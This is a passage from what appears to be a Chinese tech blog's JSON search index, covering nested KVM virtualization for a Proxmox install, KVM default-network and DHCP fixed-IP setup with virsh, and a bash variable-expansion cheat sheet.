cat /sys/module/kvm_intel/parameters/nested AMD的CPU cat /sys/module/kvm_amd/parameters/nested ​ 修改支持，以intel为例：\nvi /etc/modprobe.d/kvm.conf options kvm_intel nested=1 reboot就好\n不重启的话，可以先卸载模块，然后重新加载\nmodprobe -r kvm_intel modprobe kvm_intel 然后检查一下\ncat /sys/module/kvm_intel/parameters/nested proxmox安装的时候，指定cpu=host：\n#!/bin/sh qemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G virt-install \\ --name=proxmox-168-86-103 \\ --cpu=host \\ --ram=8192 \\ --disk path=/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format=qcow2,size=200 \\ --cdrom=/export/kvm/iso/proxmox-ve_7.0-2.iso \\ --os-type=Linux \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5903 ","permalink":"https://rendoumi.com/posts/20231214-kvm_nested/","summary":"\u003cp\u003ekvm生产的虚机内仍然可以再产虚拟机，这就是嵌套虚拟化\u003c/p\u003e\n\u003cp\u003e我们的目的是要再kvm虚机中安装一套proxmox的系统\u003c/p\u003e\n\u003cp\u003e首先在实体机上检查当前的Linux是否支持嵌套\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIntel的CPU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_intel/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAMD的CPU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_amd/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e​\n修改支持，以intel为例：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/modprobe.d/kvm.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoptions kvm_intel \u003cspan class=\"nv\"\u003enested\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ereboot就好\u003c/p\u003e\n\u003cp\u003e不重启的话，可以先卸载模块，然后重新加载\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodprobe -r kvm_intel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodprobe kvm_intel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后检查一下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_intel/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eproxmox安装的时候，指定cpu=host：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003eqemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name\u003cspan class=\"o\"\u003e=\u003c/span\u003eproxmox-168-86-103 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cpu\u003cspan class=\"o\"\u003e=\u003c/span\u003ehost \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e8192\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/proxmox-ve_7.0-2.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003eLinux  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5903\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"KVM的嵌套虚拟化"},{"content":"缺省情况下kvm会保留一个nat的网络，ip a命令查看，会看到virbr0和virbr0-nic\n8: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0 9: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 500 link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff 这个如果虚机都是静态IP，且不做NAT的话，则无必要保留，可以彻底删掉。\nkvm删除掉缺省网络\nvirsh net-destroy default virsh net-undefine default 那么如果非用不可，还需要给特定虚机用dhcp指定固定IP 方法如下：\n查看缺省网络\n$ virsh net-list Name State Autostart Persistent ---------------------------------------------------------- default active yes yes 找出虚机的mac地址\n$ virsh dumpxml vis-16-10-33 | grep -i \u0026#39;\u0026lt;mac\u0026#39; \u0026lt;mac address=\u0026#39;f0:00:ac:10:0a:21\u0026#39;/\u0026gt; 编辑网络\n$ virsh net-edit default \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;default\u0026lt;/name\u0026gt; \u0026lt;uuid\u0026gt;58e86841-ef4b-4d63-bf4f-7888515b8474\u0026lt;/uuid\u0026gt; \u0026lt;forward mode=\u0026#39;nat\u0026#39;/\u0026gt; \u0026lt;bridge name=\u0026#39;virbr0\u0026#39; stp=\u0026#39;on\u0026#39; delay=\u0026#39;0\u0026#39; /\u0026gt; \u0026lt;mac address=\u0026#39;52:54:00:6C:22:2C\u0026#39;/\u0026gt; \u0026lt;ip address=\u0026#39;192.168.122.1\u0026#39; netmask=\u0026#39;255.255.255.0\u0026#39;\u0026gt; \u0026lt;dhcp\u0026gt; \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; \u0026lt;/dhcp\u0026gt; \u0026lt;/ip\u0026gt; \u0026lt;/network\u0026gt; 在range下面来一列\n\u0026lt;dhcp\u0026gt; \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; \u0026lt;host mac=\u0026#39;f0:00:ac:10:0a:21\u0026#39; name=\u0026#39;vis-16-10-33\u0026#39; ip=\u0026#39;192.168.122.10\u0026#39;/\u0026gt; \u0026lt;/dhcp\u0026gt; 保存退出，重启网络\n$ virsh net-destroy default $ virsh net-start default 然后就可以了。\n","permalink":"https://rendoumi.com/posts/20231214-kvm_dhcp/","summary":"\u003cp\u003e缺省情况下kvm会保留一个nat的网络，ip a命令查看，会看到virbr0和virbr0-nic\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e8: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noqueue state UNKNOWN \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noop state DOWN qlen \u003cspan class=\"m\"\u003e500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个如果虚机都是静态IP，且不做NAT的话，则无必要保留，可以彻底删掉。\u003c/p\u003e\n\u003cp\u003ekvm删除掉缺省网络\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-destroy default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh net-undefine default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么如果非用不可，还需要给特定虚机用dhcp指定固定IP\n方法如下：\u003c/p\u003e\n\u003cp\u003e查看缺省网络\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ virsh net-list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Name                 State      Autostart     Persistent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e----------------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e default              active     yes           yes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e找出虚机的mac地址\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003evirsh\u003c/span\u003e \u003cspan class=\"n\"\u003edumpxml\u003c/span\u003e \u003cspan class=\"n\"\u003evis\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e33\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003egrep\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;mac\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003emac\u003c/span\u003e \u003cspan class=\"n\"\u003eaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;f0:00:ac:10:0a:21\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑网络\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ virsh net-edit default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;network\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;name\u0026gt;\u003c/span\u003edefault\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;uuid\u0026gt;\u003c/span\u003e58e86841-ef4b-4d63-bf4f-7888515b8474\u003cspan class=\"nt\"\u003e\u0026lt;/uuid\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;forward\u003c/span\u003e \u003cspan class=\"na\"\u003emode=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;nat\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;bridge\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;virbr0\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003estp=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;on\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003edelay=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;mac\u003c/span\u003e \u003cspan class=\"na\"\u003eaddress=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;52:54:00:6C:22:2C\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;ip\u003c/span\u003e \u003cspan class=\"na\"\u003eaddress=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.1\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003enetmask=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;255.255.255.0\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;dhcp\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;range\u003c/span\u003e \u003cspan class=\"na\"\u003estart=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.2\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eend=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;192.168.122.254\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/dhcp\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;/ip\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/network\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在range下面来一列\u003c/p\u003e","title":"KVM网络如何设置DHCP"},{"content":"变量子串\n${var} 返回变量var的内容，单独使用时有没有{}一样，混合多个变量和常量时，用{}界定变量名\n${#var} 返回变量var内容的长度\n${var:offset} 从变量var中的偏移量offset开始截取到字符串结尾的子字符串，offset从0开始\n${var:offset:length} 从变量var中的偏移量offset开始截取长度为length的子字符串\n${var#*.} 从变量var中删除第一个匹配的点（.）及其左边的所有字符\n${var##*.} 从变量var中删除最后一个匹配的点（.）及其左边的所有字符\n${var%.*} 从变量var中删除最后一个匹配的点（.）及其右边的所有字符\n${var%%.*} 从变量var中删除第一个匹配的点（.）及其右边的所有字符\n示例：\nvar=file.txt.tar.gz ${var#*.} #内容为\u0026#34;txt.tar.gz\u0026#34; ${var##*.} #内容为\u0026#34;gz\u0026#34; ${var%.*} #内容为\u0026#34;file.txt.tar\u0026#34; ${var%%.*} #内容为\u0026#34;file\u0026#34; 也可以使用其它Pattern和表达式，示例：\nvar=/home/xxx/aaa/file.txt #假设xxx为当前用户 # 从路径中获取文件名 ${var##*/} #内容为\u0026#34;file.txt\u0026#34; # 将绝对路径转为相对路径 # whoami是获取当前用户名，使用$()执行子shell，$(whoami)将得到xxx ~${var#*$(whoami)} #内容为\u0026#34;~/aaa/file.txt\u0026#34; ${var/pattern/string} 使用string代替第一个匹配的pattern\n${var//pattern/string} 使用string代替所有匹配的pattern\n${var,} 首字母转小写\n${var,,} 全部转小写\n${var^} 首字母转大写\n${var^^} 全部转大写\n特殊扩展变量\n${var-word} 如果变量var未赋值，则返回字符串word\n${var:-word} 如果变量var未赋值或者值为空，则返回字符串word\n${var+word} 如果变量var有值（包括空串\u0026quot;\u0026quot;），则返回字符串word\nvar1=foo var2= ${var1-word} # 内容为\u0026#34;foo\u0026#34; echo ${var2-word} # 内容为\u0026#34;\u0026#34; echo ${var2:-word} # 内容为\u0026#34;word\u0026#34; ${var:+word} 如果变量var有值且不为空，则返回字符串word\n${var=word} 如果变量var未赋值，则返回字符串word，并为var赋值为字符串word\n${var:=word} 如果变量var未赋值或者值为空串，则返回字符串word，并为var赋值为字符串word\n${var?word} 如果变量var未赋值，将字符串word作为标准错误输出，否则返回变量var的值\n${var:?word} 如果变量var未赋值或者值为空串，将字符串word作为标准错误输出，否则返回变量var的值\n数组\narray=(1 2 3 a b c) 定义一个名为array的数组，包含了6个元素，元素字段类型不需要统一\n${array[index]} 访问数组中的元素，index从0开始，如果为负表示从数组的末尾开始的偏移量\n${array[*]} 获取数组中所有元素\n${array[@]} 获取数组中所有元素\n${#array[*]} 获取数组的长度\n${#array[@]} 获取数组的长度\n${!array[@]} 获取数组索引列表，返回 0 1 2 3 4 5\narray+=(4 d) 向数组中添加元素，数组内容为 1 2 3 a b c 4 d\nunset array[6] 删除第 7 个元素，数组内容为 1 2 3 a b c d\nunset array[-1] 删除倒数第 1 个元素，数组内容为 1 2 3 a b c\n多行字符串变量\nvar=$(cat \u0026lt;\u0026lt;- \u0026#39;EOF\u0026#39; line1 line2 ... EOF) 或者使用单引号或者双引号（单引号中${}和$()等都不会取表达式的值，双引号中才会）：\nvar=\u0026#39;line1 line2 ...\u0026#39; 注意上述两种写法的差别，避免为变量内容带来不必要的空行。通过循环可依次得到变量中的每一行：\nwhile read -r line; do echo $line done \u0026lt;\u0026lt;\u0026lt; $var Shell系统变量\n$1 表示第一个参数，$2 表示第二个参数 \u0026hellip;\n$# 命令行参数的个数\n$0 当前Shell脚本程序的名称\n$? 前一个命令或函数的返回码\n$* 以 \u0026ldquo;参数1 参数2 \u0026hellip; \u0026quot; 形式获取所有参数\n$@ 以 \u0026ldquo;参数1\u0026rdquo; \u0026ldquo;参数2\u0026rdquo; \u0026hellip; 形式获取所有参数\n$$ 本程序的进程ID，即PID\n$! 上一个命令的PID\n$PPID 父进程的PID\n$UID 执行这个脚本的当前用户ID\n变量输出\n变量内容的输出使用 echo 命令。\n如果未使用 echo，则会将变量内容当成 Shell 命令来执行，常用于调用某个程序并传递参数，如：应用程序启动脚本。\n","permalink":"https://rendoumi.com/posts/20231212-shell/","summary":"\u003cp\u003e\u003cstrong\u003e变量子串\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e${var} 返回变量var的内容，单独使用时有没有{}一样，混合多个变量和常量时，用{}界定变量名\u003c/p\u003e\n\u003cp\u003e${#var} 返回变量var内容的长度\u003c/p\u003e\n\u003cp\u003e${var:offset} 从变量var中的偏移量offset开始截取到字符串结尾的子字符串，offset从0开始\u003c/p\u003e\n\u003cp\u003e${var:offset:length} 从变量var中的偏移量offset开始截取长度为length的子字符串\u003c/p\u003e\n\u003cp\u003e${var#*.} 从变量var中删除第一个匹配的点（.）及其左边的所有字符\u003c/p\u003e\n\u003cp\u003e${var##*.} 从变量var中删除最后一个匹配的点（.）及其左边的所有字符\u003c/p\u003e\n\u003cp\u003e${var%.*} 从变量var中删除最后一个匹配的点（.）及其右边的所有字符\u003c/p\u003e\n\u003cp\u003e${var%%.*} 从变量var中删除第一个匹配的点（.）及其右边的所有字符\u003c/p\u003e\n\u003cp\u003e示例：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003efile.txt.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e#*.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#内容为\u0026#34;txt.tar.gz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e##*.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"c1\"\u003e#内容为\u0026#34;gz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e%.*\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#内容为\u0026#34;file.txt.tar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e%%.*\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e \u003cspan class=\"c1\"\u003e#内容为\u0026#34;file\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e也可以使用其它Pattern和表达式，示例：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/xxx/aaa/file.txt \u003cspan class=\"c1\"\u003e#假设xxx为当前用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 从路径中获取文件名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e##*/\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#内容为\u0026#34;file.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将绝对路径转为相对路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# whoami是获取当前用户名，使用$()执行子shell，$(whoami)将得到xxx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e~\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar\u003c/span\u003e\u003cspan class=\"p\"\u003e#*\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ewhoami\u003cspan 